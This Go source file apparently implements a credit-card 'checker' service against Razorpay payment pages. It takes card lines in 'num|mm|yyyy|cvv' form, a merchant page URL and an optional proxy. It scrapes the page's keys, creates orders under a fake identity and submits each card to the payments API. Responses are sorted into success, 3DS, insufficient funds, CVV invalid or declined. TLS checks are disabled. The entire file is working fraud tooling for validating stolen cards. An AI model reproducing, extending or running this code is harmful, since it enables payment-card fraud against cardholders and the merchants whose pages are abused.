package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type RazorpayAPIResponse struct {
	CC       string `json:"cc"`
	Gateway  string `json:"Gateway"`
	Response string `json:"Response"`
	Price    string `json:"Price"`
	Currency string `json:"Currency"`
	Status   string `json:"Status"`
	Message  string `json:"Message"`
	Time     string `json:"Time"`
	Proxy    string `json:"Proxy"`
}

type PaymentResult struct {
	Status   string `json:"status"`
	Response string `json:"response"`
	Message  string `json:"message"`
}

type RazorpaySession struct {
	Client         *http.Client
	ProxyURL       string
	PageURL        string
	KeyID          string
	PageID         string
	Currency       string
	ItemID         string
	ItemAmount     int // amount in paise
	CustomAmount   int // amount in INR
	MandatoryItems []map[string]any
	KeylessHeader  string
}

func buildRazorpayHTTPClient(proxyURL string) (*http.Client, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if proxyURL != "" {
		parsedProxy, err := url.Parse(proxyURL)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy URL: %w", err)
		}
		transport.Proxy = http.ProxyURL(parsedProxy)
	}

	return &http.Client{
		Transport: transport,
		Timeout:   35 * time.Second,
	}, nil
}

func getProxyLabel(proxy string) string {
	if proxy != "" {
		return "Live"
	}
	return "None"
}

func NewRazorpaySession(client *http.Client, pageURL string) *RazorpaySession {
	return &RazorpaySession{
		Client:   client,
		PageURL:  pageURL,
		Currency: "INR",
	}
}

func (s *RazorpaySession) ScrapePage() error {
	req, err := http.NewRequest("GET", s.PageURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	resp, err := s.Client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fetch page: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read body: %w", err)
	}
	html := string(bodyBytes)

	re := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)
	match := re.FindStringSubmatch(html)
	if len(match) < 2 {
		return fmt.Errorf("could not find data block in page HTML")
	}

	var parsed map[string]any
	if err := json.Unmarshal([]byte(match[1]), &parsed); err != nil {
		return fmt.Errorf("failed to parse page JSON: %w", err)
	}

	keyID, _ := parsed["key_id"].(string)
	if keyID == "" {
		return fmt.Errorf("key_id not found in page data")
	}
	s.KeyID = keyID

	keylessRe := regexp.MustCompile(`(?i)keyless_header\s*:\s*"([^"]+)"`)
	if keylessMatch := keylessRe.FindStringSubmatch(html); len(keylessMatch) > 1 {
		s.KeylessHeader = keylessMatch[1]
	} else if keylessVal, ok := parsed["keyless_header"].(string); ok {
		s.KeylessHeader = keylessVal
	}

	paymentLink, _ := parsed["payment_link"].(map[string]any)
	if paymentLink == nil {
		return fmt.Errorf("payment_link metadata not found")
	}

	pageID, _ := paymentLink["id"].(string)
	if pageID == "" {
		return fmt.Errorf("payment page ID not found")
	}
	s.PageID = pageID

	currency, _ := paymentLink["currency"].(string)
	if currency == "" {
		currency = "INR"
	}
	s.Currency = currency

	var globalMin int
	if val, ok := paymentLink["min_amount_value"].(float64); ok && val > 0 {
		globalMin = int(val)
	} else if val, ok := parsed["min_amount_value"].(float64); ok && val > 0 {
		globalMin = int(val)
	}

	items, _ := paymentLink["payment_page_items"].([]any)
	for _, it := range items {
		itemMap, ok := it.(map[string]any)
		if !ok {
			continue
		}
		id, _ := itemMap["id"].(string)

		var mandatory bool
		if mandVal, ok := itemMap["mandatory"].(bool); ok {
			mandatory = mandVal
		} else if mandValStr, ok := itemMap["mandatory"].(string); ok {
			mandatory = strings.EqualFold(mandValStr, "true") || mandValStr == "1"
		}

		itemDetail, _ := itemMap["item"].(map[string]any)
		var unitAmt float64
		if itemDetail != nil {
			if val, ok := itemDetail["amount"].(float64); ok && val > 0 {
				unitAmt = val
			} else if val, ok := itemDetail["unit_amount"].(float64); ok && val > 0 {
				unitAmt = val
			} else if valStr, ok := itemDetail["amount"].(string); ok {
				unitAmt, _ = strconv.ParseFloat(valStr, 64)
			} else if valStr, ok := itemDetail["unit_amount"].(string); ok {
				unitAmt, _ = strconv.ParseFloat(valStr, 64)
			}
		}

		if unitAmt == 0 {
			if val, ok := itemDetail["min_amount"].(float64); ok && val > 0 {
				unitAmt = val
			} else if val, ok := itemMap["min_amount"].(float64); ok && val > 0 {
				unitAmt = val
			}
		}

		itemAmountInt := int(unitAmt)
		if itemAmountInt < globalMin {
			itemAmountInt = globalMin
		}

		if mandatory || s.ItemID == "" {
			if s.ItemID == "" {
				s.ItemID = id
				s.ItemAmount = itemAmountInt
			}
			if mandatory {
				s.MandatoryItems = append(s.MandatoryItems, map[string]any{
					"payment_page_item_id": id,
					"amount":               itemAmountInt,
				})
			}
		}
	}

	if s.ItemAmount == 0 && len(s.MandatoryItems) == 0 {
		if s.CustomAmount <= 0 {
			s.CustomAmount = 100
		}
		s.ItemAmount = s.CustomAmount * 100
		if s.ItemAmount < globalMin {
			s.ItemAmount = globalMin
		}
		s.MandatoryItems = append(s.MandatoryItems, map[string]any{
			"payment_page_item_id": s.ItemID,
			"amount":               s.ItemAmount,
		})
	} else if len(s.MandatoryItems) > 0 {
		total := 0
		for _, item := range s.MandatoryItems {
			if amt, ok := item["amount"].(int); ok {
				total += amt
			}
		}
		s.ItemAmount = total
	}

	return nil
}

func (s *RazorpaySession) CreateOrder(name, email, phone string) (string, error) {
	targetURL := fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", s.PageID)

	lineItems := s.MandatoryItems
	if len(lineItems) == 0 {
		lineItems = []map[string]any{
			{
				"payment_page_item_id": s.ItemID,
				"amount":               s.ItemAmount,
			},
		}
	}

	payload := map[string]any{
		"line_items": lineItems,
		"notes": map[string]string{
			"name":  name,
			"email": email,
			"phone": phone,
		},
	}

	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest("POST", targetURL, bytes.NewReader(bodyBytes))
	if err != nil {
		return "", err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://pages.razorpay.com")
	req.Header.Set("Referer", s.PageURL)
	if s.KeylessHeader != "" {
		req.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
	}

	resp, err := s.Client.Do(req)
	if err != nil {
		return "", fmt.Errorf("order initialization failed: %w", err)
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return "", fmt.Errorf("order creation HTTP %d: %s", resp.StatusCode, string(respBytes))
	}

	var parsed map[string]any
	if err := json.Unmarshal(respBytes, &parsed); err != nil {
		return "", err
	}

	orderData, _ := parsed["order"].(map[string]any)
	if orderData == nil {
		return "", fmt.Errorf("order object missing in response: %s", string(respBytes))
	}

	orderID, _ := orderData["id"].(string)
	if orderID == "" {
		return "", fmt.Errorf("order_id missing in response")
	}

	return orderID, nil
}

func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, email, phone, orderID string) (*PaymentResult, error) {
	targetURL := "https://api.razorpay.com/v1/payments"

	payload := map[string]any{
		"key_id":   s.KeyID,
		"order_id": orderID,
		"amount":   s.ItemAmount,
		"currency": s.Currency,
		"email":    email,
		"contact":  phone,
		"method":   "card",
		"card": map[string]string{
			"number":       cardNo,
			"cvv":          cvv,
			"expiry_month": expMonth,
			"expiry_year":  expYear,
			"name":         name,
		},
		"_": map[string]string{
			"integration":      "payment_pages",
			"integration_type": "rzp_app",
			"version":          "1.24.0",
		},
	}

	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", targetURL, bytes.NewReader(bodyBytes))
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://pages.razorpay.com")
	req.Header.Set("Referer", s.PageURL)
	if s.KeylessHeader != "" {
		req.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
	}

	resp, err := s.Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("payment submission failed: %w", err)
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	respStr := string(respBytes)
	reData := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)

	if strings.Contains(respStr, "payments/create/checkout") {
		formActionRe := regexp.MustCompile(`(?i)<form[^>]+action=['"]([^'"]+)['"]`)
		actionMatch := formActionRe.FindStringSubmatch(respStr)
		if len(actionMatch) > 1 {
			actionURL := actionMatch[1]

			inputRe := regexp.MustCompile(`(?i)<input[^>]+type=['"]hidden['"][^>]+name=['"]([^'"]+)['"][^>]+value=['"]([^'"]*)['"]`)
			inputMatches := inputRe.FindAllStringSubmatch(respStr, -1)

			formData := url.Values{}
			for _, m := range inputMatches {
				if len(m) > 2 {
					formData.Set(m[1], m[2])
				}
			}

			req2, err := http.NewRequest("POST", actionURL, strings.NewReader(formData.Encode()))
			if err == nil {
				req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
				req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req2.Header.Set("Origin", "https://pages.razorpay.com")
				req2.Header.Set("Referer", s.PageURL)
				if s.KeylessHeader != "" {
					req2.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
				}

				resp2, err2 := s.Client.Do(req2)
				if err2 == nil {
					defer resp2.Body.Close()
					resp2Bytes, _ := io.ReadAll(resp2.Body)
					respBytes = resp2Bytes
					respStr = string(resp2Bytes)
				}
			}
		}
	}

	var parsed map[string]any
	if match := reData.FindStringSubmatch(respStr); len(match) > 1 {
		_ = json.Unmarshal([]byte(match[1]), &parsed)
	} else {
		_ = json.Unmarshal(respBytes, &parsed)
	}

	if parsed != nil {
		if errData, ok := parsed["error"].(map[string]any); ok {
			reason, _ := errData["reason"].(string)
			desc, _ := errData["description"].(string)
			code, _ := errData["code"].(string)
			if desc == "" {
				desc = reason
			}
			if desc == "" {
				desc = code
			}
			if desc == "" {
				desc = "Declined by gateway"
			}

			responseCode := "CARD_DECLINED"
			statusText := "false"

			reasonUpper := strings.ToUpper(reason + " " + desc + " " + code)

			if strings.Contains(reasonUpper, "TEMPORARY BLOCK") ||
				strings.Contains(reasonUpper, "PUT ON HOLD") ||
				strings.Contains(reasonUpper, "DEACTIVATED") ||
				strings.Contains(reasonUpper, "ACCOUNT BLOCKED") ||
				strings.Contains(reasonUpper, "SITE ADMIN") ||
				strings.Contains(reasonUpper, "MANDATORY PAYMENT PAGE ITEM") ||
				strings.Contains(reasonUpper, "SHOULD BE ORDERED") {
				responseCode = "SITE_ERROR"
				statusText = "SiteError"
			} else if strings.Contains(reasonUpper, "INSUFFICIENT") {
				responseCode = "INSUFFICIENT_FUNDS"
			} else if strings.Contains(reasonUpper, "CVV") || strings.Contains(reasonUpper, "VERIFICATION") {
				responseCode = "CVV_INVALID"
			} else if strings.Contains(reasonUpper, "EXPIRED") {
				responseCode = "EXPIRED_CARD"
			}

			return &PaymentResult{
				Status:   statusText,
				Response: responseCode,
				Message:  desc,
			}, nil
		}

		if parsed["callback_url"] != nil || parsed["next"] != nil || parsed["action"] != nil {
			return &PaymentResult{
				Status:   "3ds",
				Response: "3DS_REQUIRED",
				Message:  "Card verification (OTP/3DS) is required by the bank",
			}, nil
		}

		status, _ := parsed["status"].(string)
		if status == "captured" || status == "authorized" {
			return &PaymentResult{
				Status:   "success",
				Response: "SUCCESS",
				Message:  "Payment authorized successfully",
			}, nil
		}

		if status != "" {
			return &PaymentResult{
				Status:   "fail",
				Response: "CARD_DECLINED",
				Message:  fmt.Sprintf("Payment status: %s", status),
			}, nil
		}
	}

	return &PaymentResult{
		Status:   "fail",
		Response: "GATEWAY_ERROR",
		Message:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBytes)),
	}, nil
}

func handleRazorpayAPI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	startTime := time.Now()
	ccLine := r.URL.Query().Get("cc")
	siteURL := r.URL.Query().Get("site")
	proxyURL := r.URL.Query().Get("proxy")
	amountStr := r.URL.Query().Get("amount")

	if ccLine == "" || siteURL == "" {
		w.WriteHeader(http.StatusBadRequest)
		_, _ = w.Write([]byte(`{"error":"Missing cc or site parameter"}`))
		return
	}

	customAmount := 10
	if amountStr != "" {
		if val, err := strconv.Atoi(amountStr); err == nil && val > 0 {
			customAmount = val
		}
	}

	parts := strings.Split(ccLine, "|")
	if len(parts) < 4 {
		w.WriteHeader(http.StatusBadRequest)
		_, _ = w.Write([]byte(`{"error":"Invalid cc format. Expected num|mm|yyyy|cvv"}`))
		return
	}
	cardNo, expMonth, expYear, cvv := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]), strings.TrimSpace(parts[2]), strings.TrimSpace(parts[3])

	client, err := buildRazorpayHTTPClient(proxyURL)
	if err != nil {
		resp := RazorpayAPIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "PROXY_ERROR",
			Status:   "false",
			Message:  fmt.Sprintf("Proxy build error: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	session := NewRazorpaySession(client, siteURL)
	session.CustomAmount = customAmount

	if err := session.ScrapePage(); err != nil {
		resp := RazorpayAPIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "SITE_ERROR",
			Status:   "SiteError",
			Message:  fmt.Sprintf("Failed to parse page: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	orderID, err := session.CreateOrder("Jane Doe", "janedoe@example.com", "+919876543210")
	if err != nil {
		resp := RazorpayAPIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "SITE_ERROR",
			Status:   "SiteError",
			Message:  fmt.Sprintf("%v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	result, err := session.SubmitPayment(cardNo, expMonth, expYear, cvv, "Jane Doe", "janedoe@example.com", "+919876543210", orderID)
	if err != nil {
		resp := RazorpayAPIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "SUBMIT_FAILED",
			Status:   "false",
			Message:  fmt.Sprintf("Payment submission error: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	status := "false"
	switch result.Status {
	case "success", "3ds":
		status = "true"
	case "SiteError":
		status = "SiteError"
	}

	resp := RazorpayAPIResponse{
		CC:       ccLine,
		Gateway:  "Razorpay Pages",
		Response: result.Response,
		Price:    fmt.Sprintf("%.2f", float64(session.ItemAmount)/100.0),
		Currency: session.Currency,
		Status:   status,
		Message:  result.Message,
		Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
		Proxy:    getProxyLabel(proxyURL),
	}
	jsonResp, _ := json.Marshal(resp)
	_, _ = w.Write(jsonResp)
}
